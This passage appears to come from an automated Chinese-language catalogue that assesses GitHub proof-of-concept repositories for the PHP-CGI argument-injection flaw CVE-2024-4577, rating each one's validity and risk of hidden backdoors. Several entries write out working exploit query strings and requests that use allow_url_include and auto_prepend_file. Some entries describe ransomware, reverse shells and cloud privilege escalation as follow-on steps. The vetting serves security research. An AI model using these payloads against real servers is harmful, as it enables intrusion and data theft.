**项目地址:** [Night-have-dreams/php-cgi-Injector](https://github.com/Night-have-dreams/php-cgi-Injector)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #16

**来源**: [CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md](../2024/CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的 PHP 服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows 系统，运行于 CGI 模式下的 PHP，且系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统以 CGI 模式运行时，由于系统代码页的 "Best Fit" 行为导致参数注入的远程代码执行漏洞。攻击者可以通过构造恶意的 HTTP 请求，将恶意参数传递给 PHP 解释器，从而执行任意代码。

**有效性评估：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞的有效性很高。漏洞库明确指出该漏洞的存在，并提供了受影响的版本范围。搜索引擎结果显示，该漏洞在野外已存在利用，且有公开的 PoC 代码可供验证。漏洞利用代码（Incident Response Walkthrough）提供了一个应对 CVE-2024-4577 攻击的案例分析，虽未直接提供 PoC 代码，但分析过程表明了该漏洞可被利用，并附带了模拟攻击场景。

**投毒风险分析：**

提供的漏洞利用代码主要是一个事件响应的演练文档，用于分析和缓解 CVE-2024-4577 漏洞。它主要关注识别漏洞、分析攻击者行为以及确定受影响的系统。虽然该文档提到了攻击者可能执行的命令（whoami.exe、calc.exe），但它本身并不包含任何恶意代码。因此，可以认为此仓库中作者隐藏的投毒代码的可能性较低，约为 5%。 这 5% 的可能性是基于对任何代码库都不能完全排除潜在风险的一般安全考虑。

**利用方式分析：**

1.  **环境要求：** 目标系统必须是 Windows，PHP 运行于 CGI 模式，并且启用了使用 "Best Fit" 策略的代码页。
2.  **漏洞触发：** 攻击者发送包含恶意构造参数的 HTTP 请求。这些参数会被 Windows 的 "Best Fit" 代码页转换机制错误地解释为 PHP 选项。
3.  **代码执行：** PHP 解释器执行被注入的恶意选项，导致任意代码执行。

攻击者通过构造特殊的 URL 或 POST 数据，将恶意的 PHP 参数注入到 PHP 进程中。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数直接执行 PHP 代码。利用方式依赖于服务器的配置和 PHP 版本的具体细节。

**项目地址:** [PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough](https://github.com/PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #17

**来源**: [CVE-2024-4577-Skycritch_CVE-2024-4577.md](../2024/CVE-2024-4577-Skycritch_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是PHP的一个远程代码执行漏洞，存在于Windows系统上以CGI模式运行的PHP中。当系统配置为使用某些代码页时，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码，在服务器上运行任意PHP代码等。 

**有效性分析：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，存在公开的PoC利用代码。漏洞利用代码 `CVE-2024-4577.py` 尝试通过在URL中注入PHP选项来利用此漏洞。具体来说，它设置 `allow_url_include` 为 1，并使用 `auto_prepend_file` 包含 `php://input`，然后将要执行的PHP代码通过POST请求发送到目标URL。如果返回结果中包含“1337”，则认为漏洞利用成功。

**投毒风险分析：**
查看提供的POC代码，主要功能是利用漏洞执行任意PHP代码。 `CVE-2024-4577.py`  没有发现明显的恶意代码，该脚本的主要作用是发送包含恶意PHP代码的请求。风险很低。
`README.md`文件只包含漏洞名称，没有投毒风险。
整体投毒风险评估为1%。

**利用方式：**
利用方式如下：
1.  攻击者需要找到运行在Windows服务器上的、使用CGI模式的、且存在漏洞的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）。
2.  攻击者构造包含恶意PHP选项的URL，并将其附加到目标PHP脚本的URL后面。
3.  攻击者使用POST请求将要执行的PHP代码发送到服务器。
4.  如果漏洞利用成功，服务器将执行攻击者提供的PHP代码。

**优先级排序依据：**
根据您的要求，分析时遵循以下优先级：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息。
搜索引擎结果用于确认漏洞的广泛性和影响，漏洞利用代码用于分析利用方式和潜在的投毒风险，漏洞库信息用于验证漏洞的存在和影响范围。

**项目地址:** [Skycritch/CVE-2024-4577](https://github.com/Skycritch/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #18

**来源**: [CVE-2024-4577-VictorShem_CVE-2024-4577.md](../2024/CVE-2024-4577-VictorShem_CVE-2024-4577.md)

## CVE-2024-4577 - PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (运行于 Windows CGI 模式)

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统上 PHP 以 CGI 模式运行，且系统启用了使用 "Best Fit" 策略的代码页。通常是 XAMPP 环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统中以 CGI 模式运行时的一个参数注入漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或执行任意 PHP 代码。

**有效性：** 提供的 POC 代码 `CVE-2024-4577.yaml` 看起来是有效的 Nuclei 模板，旨在检测和利用此漏洞。它通过向目标 URL 发送带有特殊构造的 payload 的 HTTP 请求，payload 中包含 `%AD` 字符和恶意的 PHP 配置选项（`allow_url_include=1` 和 `auto_prepend_file=php://input`），以及要执行的 PHP 代码（`<?php phpinfo(); ?>`）。如果漏洞存在且利用成功，服务器应该返回包含 PHP 版本信息的页面。

**投毒风险：**
查看了提供的 POC 代码 `CVE-2024-4577.yaml` 和 `README.md` 文件。其中利用方式是通过构造特定的 URL，包含 `%AD` 字符以及 `allow_url_include` 和 `auto_prepend_file` 等配置项，结合 POST 请求执行 PHP 代码。这个利用过程本身就是一种后门植入的方式，但这是漏洞利用的固有行为，不应被视为恶意投毒。

`README.md` 中包含用于 FOFA 和 Censys 的搜索语句，用于发现暴露在公网上的 XAMPP 服务器。这部分内容本身无害，只是为了方便漏洞发现和利用。但也可能会被恶意攻击者利用。

综合来看，该仓库中不存在明显的恶意投毒代码，但存在被滥用的风险，因此给出 10% 的投毒风险。

**利用方式：**
1.  **环境准备：** 目标系统必须是运行在 Windows 上的 PHP，并且是以 CGI 模式运行。同时，系统的代码页需要启用 "Best Fit" 策略。
2.  **构造 Payload：** 攻击者需要构造包含 `%AD` 字符的特殊 URL，以及恶意的 PHP 配置选项，例如 `allow_url_include=1` 和 `auto_prepend_file=php://input`。其中 `%AD` 是触发 Windows "Best Fit" 转换的关键。
3.  **发送请求：** 攻击者通过 HTTP POST 请求将构造好的 payload 发送到目标服务器的 PHP 脚本，同时在 POST body 中包含要执行的 PHP 代码。
4.  **远程代码执行：** 如果漏洞存在且利用成功，目标服务器将执行 POST body 中的 PHP 代码，从而实现远程代码执行。

**项目地址:** [VictorShem/CVE-2024-4577](https://github.com/VictorShem/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #19

**来源**: [CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，运行于Windows+Apache+PHP-CGI环境，且启用了Best-Fit策略的CodePage

**利用条件:** 目标服务器需满足特定PHP版本、Windows环境、Apache服务器、PHP-CGI模式，以及存在使用Best-Fit策略的CodePage设置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，存在于Windows平台的特定PHP版本中。攻击者可以通过精心构造的URL，利用Windows系统的“Best Fit”字符转换特性，将恶意参数注入到PHP的执行命令中，最终实现远程代码执行。 

**有效性:**
提供的POC代码是有效的，通过发送包含`allow_url_include`和`auto_prepend_file`参数的POST请求，并包含PHP代码`<?php phpinfo(); ?>`，如果目标存在漏洞，则会执行该代码并返回`phpinfo()`的结果。

**投毒风险:**
提供的代码主要用于检测漏洞是否存在，功能较为直接，没有发现隐藏的恶意代码或后门。该仓库的`CODEOWNERS`文件中只包含`@zephrfish`，该用户有代码审核权，因此综合评估认为投毒的可能性较低。

**利用方式:**
1.  **环境确认:** 漏洞利用前需要确认目标服务器是否满足以下条件：
    *   Windows操作系统
    *   Apache服务器
    *   PHP以CGI模式运行
    *   PHP版本为受影响的范围（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）
    *   系统启用了使用“Best-Fit”策略的CodePage
2.  **构造恶意URL:** 构造包含恶意参数的URL。关键在于使用`%25ADd`来代替`-d`，结合`allow_url_include`和`auto_prepend_file`选项，允许远程包含恶意PHP代码。
3.  **发送请求:** 使用POST方法发送包含PHP代码的请求，例如`<?php phpinfo(); ?>`或更具危害性的代码。
4.  **执行任意代码:** 成功利用漏洞后，可以在目标服务器上执行任意PHP代码，从而控制服务器。

**项目地址:** [ZephrFish/CVE-2024-4577-PHP-RCE](https://github.com/ZephrFish/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #20

**来源**: [CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-ZeroMemoryEx_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP (Windows CGI)

**危害等级:** 极高，远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个存在于Windows PHP-CGI配置中的严重漏洞。当PHP以CGI模式在Windows服务器上运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”策略来替换命令行参数中的字符。PHP-CGI模块可能会错误地将这些替换后的字符解析为PHP选项，从而允许攻击者向PHP二进制文件传递恶意参数。这可能导致泄露脚本源码，执行任意PHP代码，甚至在服务器上执行操作系统命令。

**利用方式：**

1.  **攻击向量：** 通过HTTP请求，构造恶意的URL或POST数据，向PHP-CGI传递恶意参数。
2.  **利用条件：**
    *   目标服务器是Windows系统。
    *   PHP以CGI模式运行。
    *   Web服务器（如Apache）用于处理PHP请求。
    *   系统启用了特定的代码页，允许字符替换。
3.  **攻击步骤：**
    *   利用Windows的“Best-Fit”字符替换机制，将特殊字符转换为PHP选项。
    *   通过`?`或`-`等字符引导，注入恶意PHP配置选项，例如`-d allow_url_include=1 -d auto_prepend_file=php://input`。
    *   通过`POST`请求发送PHP代码，实现远程代码执行。

**有效性：**

根据漏洞描述、搜索结果以及提供的POC代码，该漏洞的利用是有效的。已经有公开的PoC代码可以实现远程代码执行。漏洞库信息和搜索引擎结果都确认了该漏洞的存在以及可利用性。

提供的PoC利用了DNS重绑定技术，允许攻击者通过受害者的浏览器，对内网的PHP-CGI服务器进行攻击。这个方法绕过了同源策略(SOP)，使得攻击者能够攻击原本无法直接从外部访问的内网系统。

**投毒风险：**

提供的PoC代码主要由三个部分组成: `README.md`, `client.html`。其中`README.md`文件主要描述漏洞原理、利用方式和配置说明，`client.html`是漏洞利用的核心代码。

*  **client.html分析:**  该文件包含Javascript代码，用于执行DNS重绑定攻击，并向目标IP发送包含恶意payload的请求。攻击payload可以在 `client.html`文件中被修改.

虽然该PoC本身旨在利用漏洞，但以下情况可能构成投毒风险：

1.  **依赖的第三方服务:**  PoC依赖于`duckdns.org`提供DNS服务, 一旦服务出现问题或者被劫持,可能会导致PoC失效甚至被恶意利用。
2.  **内网扫描IP列表:** `client.html`中包含一个可以修改的内网IP列表. 如果这个列表被替换成其他恶意IP地址，可能导致攻击者扫描或攻击非预期目标。
3.  **Payload内容:**  虽然默认的payload为`calc`,用户可以自定义payload,潜在的风险在于如果用户不熟悉PHP, 可能会引入不安全的PHP代码或者连接恶意URL。
4.  **DNS Rebinding 的滥用:**  DNS Rebinding 本身就是一项有争议的技术，在没有充分安全措施的情况下使用，可能会造成隐私泄露或者其他安全问题。

因此，综合考量，该仓库的投毒风险评定为10%。主要风险在于使用者可能修改PoC中的payload或者IP列表，从而引入额外的风险。作者本身并没有加入后门代码。

**项目地址:** [ZeroMemoryEx/PHP-CGI-INTERNAL-RCE](https://github.com/ZeroMemoryEx/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #21

**来源**: [CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-a-roshbaik_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统配置为使用某些代码页（存在"Best-Fit"行为）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个PHP-CGI的参数注入漏洞，影响在Windows上运行的PHP。当PHP在CGI模式下与Apache结合使用时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，允许恶意用户将选项传递给PHP二进制文件，从而可能泄露源代码，运行任意PHP代码等。

**漏洞利用方式：**

1.  **EXP 1 (绕过WAF和默认场景):** 通过运行提供的Python脚本`CVE-2024-4577-PHP-RCE.py`，该脚本模拟FastCGI客户端与PHP-CGI通信，从而执行任意代码。该方法不需要 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 配置，并且绕过WAF。
2.  **EXP 2 (SSRF场景):** 使用`data://`协议结合GET请求，通过URL传递参数来利用漏洞。例如：
    `http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"`
3.  **EXP 3 (默认场景):** 使用POST请求，通过`php://input`来包含PHP代码。
    `POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1`
    `Host: PhpServerHost`
    `<?php die("Te"."sT");?>`
4.  **EXP 4 (默认场景):** 类似于EXP 3，但使用`REDIRECT-STATUS`头。

**有效性：**

从漏洞库信息，搜索引擎结果和提供的利用代码来看，该漏洞的POC已经公开，并且在野外已经存在利用。多个安全厂商已经发布了相关的分析报告和防护措施，证明该漏洞的有效性。

**投毒风险：**

`CVE-2024-4577-PHP-RCE.py`脚本本身主要功能是发送特制的FastCGI请求，用于触发漏洞，实现RCE。虽然脚本本身看起来是无害的，但是存在很小的潜在风险：

1.  **硬编码的IP地址/端口：**脚本中可以指定目标主机的IP和端口，攻击者可能通过诱导用户使用脚本，从而攻击特定的目标。
2.  **包含任意文件：** 脚本允许包含任意文件，这意味着如果攻击者可以控制`script_filename`变量，就可以读取敏感文件或执行恶意代码。
3. **FastCGI服务端:** EXP1 会建立FastCGI服务端,如果攻击者恶意利用,可能会导致拒绝服务攻击。

基于上述分析，存在一定的投毒风险，但可能性较低，估计在10%左右。

总体来说，该漏洞利用代码主要依赖于目标环境存在漏洞，并且利用代码的目的是为了验证漏洞的存在和实现RCE。作者的README.md中提及绕过WAF，但主要是通过改变利用方式实现的，并不属于投毒范畴。

**项目地址:** [a-roshbaik/CVE-2024-4577-PHP-RCE](https://github.com/a-roshbaik/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #22

**来源**: [CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md](../2024/CVE-2024-4577-a1ex-var1amov_ctf-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.x < 8.1.29, 8.2.x < 8.2.20, 8.3.x < 8.3.8（Windows环境，CGI模式，开启Best Fit策略的CodePage）

**利用条件:** Windows系统，PHP以CGI模式运行，启用了使用"Best Fit"策略的CodePage。目标服务器未安装补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP CGI参数注入漏洞，存在于PHP的Windows版本中，当PHP以CGI模式运行时，如果系统设置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行参数中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本的源代码，或者在服务器上执行任意PHP代码。

**有效性：**
根据漏洞描述和搜索结果，该漏洞影响特定版本的PHP，并且有公开的PoC代码，证明该漏洞是有效的。多个安全厂商和研究人员已经确认了该漏洞的存在并发布了相关的分析和利用方法。

**投毒风险：**
提供的CTF_WALKTHROUGH.md文件本身是漏洞利用的教程，其中包含的攻击脚本用于测试、文件读取、命令执行、容器逃逸、AWS权限提升以及持久化等攻击步骤。这些脚本可以被用于恶意目的，但教程本身是中立的，风险点在于用户是否清楚脚本的功能，是否存在其他关联的，具有恶意目的的脚本或配置，因此投毒风险为10%。因为没有发现明显的恶意代码，所以投毒风险较低。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的HTTP请求，在URL的`PATH_INFO`部分注入特殊字符（如`%0a`，换行符），使得PHP CGI在解析命令行参数时出现错误。
2.  **参数注入：** 注入的换行符将URL分割成多个参数，攻击者可以利用此特性注入PHP的命令行选项，例如`-d`选项用于设置PHP配置指令。
3.  **执行任意代码/读取文件：** 攻击者可以设置`allow_url_include=1`以允许包含远程文件，然后设置`auto_prepend_file`或者`auto_append_file`为包含恶意PHP代码的文件或者`/flag.txt`等敏感文件，从而执行任意PHP代码或者读取文件。
4.  **其他攻击：** 进一步的，攻击者可以尝试容器逃逸，访问AWS资源，甚至创建后门实现持久化控制。

**项目地址:** [a1ex-var1amov/ctf-cve-2024-4577](https://github.com/a1ex-var1amov/ctf-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #23

**来源**: [CVE-2024-4577-aaddmin1122345_cve-2024-4577.md](../2024/CVE-2024-4577-aaddmin1122345_cve-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** < 8.1.29, < 8.2.20, < 8.3.8 (在Windows上运行，并启用Best-Fit策略的code page的CGI模式)

**利用条件:** PHP以CGI模式在Windows上运行，并且启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个存在于PHP中的远程代码执行漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，这可能允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行服务器上的任意PHP代码。

**利用方式：**

1.  攻击者发送特制的HTTP请求，其中包含恶意构造的查询字符串。该查询字符串包含被Windows "Best-Fit"代码页转换解释为PHP配置选项的字符。
2.  服务器接收到请求后，会将查询字符串传递给PHP CGI解释器。
3.  PHP CGI解释器错误地将恶意构造的字符串解析为PHP选项，如`allow_url_include`和`auto_prepend_file`。
4.  通过设置这些选项，攻击者可以包含远程文件，从而执行任意PHP代码。

**POC分析：**

提供的Python脚本`cve-2024-4577.py`实现了利用此漏洞的POC。脚本接受目标URL和可选的自定义payload作为参数。

*   如果未提供自定义payload，脚本将尝试执行`phpinfo()`函数以验证漏洞是否存在。
*   如果提供了自定义payload，脚本将使用该payload来执行任意PHP代码。Readme文件提供了使用示例。
*   脚本通过构造包含特殊字符的URL，并向其发送POST请求来利用漏洞。特殊字符会被Windows的Best-Fit机制转换成PHP可识别的配置指令，最终执行攻击者注入的PHP代码。

**投毒风险分析：**

通过对提供的POC代码进行分析，没有发现作者隐藏的恶意代码或后门。该脚本的功能是按照预期执行漏洞利用，没有额外的、未声明的行为。因此，投毒风险评估为0%。

**项目地址:** [aaddmin1122345/cve-2024-4577](https://github.com/aaddmin1122345/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #24

**来源**: [CVE-2024-4577-ahmetramazank_CVE-2024-4577.md](../2024/CVE-2024-4577-ahmetramazank_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响在Windows上运行的PHP的严重漏洞。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**利用方式：**

1.  **利用点：** CGI模式下，Windows系统的字符编码转换。
2.  **攻击向量：** 通过构造特殊的URL，利用`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`将恶意PHP代码注入到`php://input`流中。
3.  **漏洞验证：** 通过发送包含`<?php phpinfo();`的POST请求，观察服务器是否返回PHP信息页面。
4.  **远程代码执行：** 上传并执行恶意脚本，例如反向shell或勒索软件。

**投毒风险分析：**

提供的POC代码主要包含以下文件：

*   `README.md`: 漏洞描述和利用步骤。
*   `encoded.ps1`: 用于解码被加密的zip文件，用于解密勒索软件加密的文件。
*   `ransomware.ps1`: 勒索软件脚本，用于加密文件和上传zip文件。

`ransomware.ps1` 脚本尝试将文件压缩为 ZIP 文件，然后将其上传到 `http://192.168.176.130:5000/upload`。如果上传成功，则使用 Base64 对 ZIP 文件进行编码，并保存到 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt`。

`encoded.ps1` 脚本从 `C:\Users\ahmet\Desktop\battalbelgeler_encoded.txt` 读取 Base64 编码的数据，对其进行解码，并将解码后的数据写入 `C:\Users\ahmet\Desktop\battalbelgeler_decoded.zip`。

主要风险在于，攻击者可能会在`ransomware.ps1`中隐藏恶意代码，例如：

*   **后门：** 在上传的文件中植入后门，以便后续访问受感染的系统。
*   **数据窃取：** 在上传过程中窃取敏感数据。
*   **反向shell**: 在机器上执行后门代码，获得shell控制权限

虽然这个仓库的主要目的是演示漏洞，但由于涉及到勒索软件的部署和文件的上传，存在一定的风险，**作者可能在脚本中植入了额外的恶意功能**。考虑到`ransomware.ps1`需要上传文件到一个外部地址，并且可能包含一些未知的恶意行为，因此初步评估投毒风险为10%。

**项目地址:** [ahmetramazank/CVE-2024-4577](https://github.com/ahmetramazank/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #25

**来源**: [CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md](../2024/CVE-2024-4577-bibo318_CVE-2024-4577-RCE-ATTACK.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式, 特定代码页)

**利用条件:** Windows服务器, 运行在CGI模式下的PHP, 系统配置为使用某些代码页, 允许"Best-Fit"行为替换字符。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的参数注入漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而可能泄露脚本源代码或在服务器上运行任意 PHP 代码。

**有效性分析：**
根据漏洞信息，搜索引擎结果和提供的PoC代码，该漏洞利用的有效性较高。漏洞库信息表明该漏洞已被公开披露，并且存在受影响的版本范围。搜索引擎结果显示，该漏洞在公开后不久就出现了大量的利用尝试。PoC代码提供了一个扫描器和利用工具，可以用来检测和利用此漏洞。该PoC代码通过构造包含特定参数的URL，并结合`php://input`流，允许执行任意PHP代码。

**投毒风险分析：**
PoC代码主要包含以下功能：
1.  **Payload选择：** 提供了几个不同的payload，攻击者可以选择使用哪个payload进行攻击。
2.  **漏洞扫描：** 通过发送带有payload的POST请求，检测目标是否存在漏洞，根据响应内容判断。
3.  **漏洞利用：** 读取用户提供的PHP payload文件内容，并通过POST请求发送到目标服务器执行。

风险点在于payload文件的内容。如果payload文件本身包含恶意代码（例如反弹shell、webshell等），那么执行利用操作会导致服务器被植入后门。PoC代码本身没有明显的恶意行为，风险主要来自用户提供的payload。代码存在投毒风险，是因为攻击者可能会修改脚本，在用户不知情的情况下，添加额外的恶意操作，例如：在成功利用后，自动下载并执行特定的恶意文件。或者将服务器信息发送到指定服务器。因此，使用此PoC需要谨慎，验证payload的内容，并确保来源可信，降低投毒风险。投毒风险评估为10%，主要是考虑到使用者可能会引入恶意payload文件。

**利用方式分析：**
1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP运行在CGI模式下。
2.  **配置系统代码页：** 目标系统需要配置为使用某些代码页，允许 "Best-Fit" 行为。
3.  **构造恶意请求：** 构造包含恶意参数的URL。这些参数通常包含 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将POST请求的内容作为PHP代码执行。
4.  **发送PHP Payload：**  通过POST请求将包含恶意代码的PHP payload发送到目标服务器。由于`auto_prepend_file`参数的存在，POST请求中的PHP代码会被执行，从而实现远程代码执行。
5.  **执行任意代码：**  成功利用漏洞后，可以在目标服务器上执行任意代码，例如：上传webshell，获取服务器权限。

**项目地址:** [bibo318/CVE-2024-4577-RCE-ATTACK](https://github.com/bibo318/CVE-2024-4577-RCE-ATTACK)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #26

**来源**: [CVE-2024-4577-bughuntar_CVE-2024-4577.md](../2024/CVE-2024-4577-bughuntar_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

